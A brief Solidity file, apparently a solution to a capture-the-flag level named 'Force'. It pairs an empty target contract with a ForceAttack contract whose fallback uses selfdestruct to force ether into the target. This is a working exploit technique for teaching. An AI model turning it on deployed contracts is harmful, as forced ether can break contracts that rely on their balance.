// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceAttack {
    address payable _forceInstAddr;

    constructor(address payable forceInstAddress) public {
        _forceInstAddr = forceInstAddress;
    }

    fallback() external payable {
        selfdestruct(_forceInstAddr);
    }
}
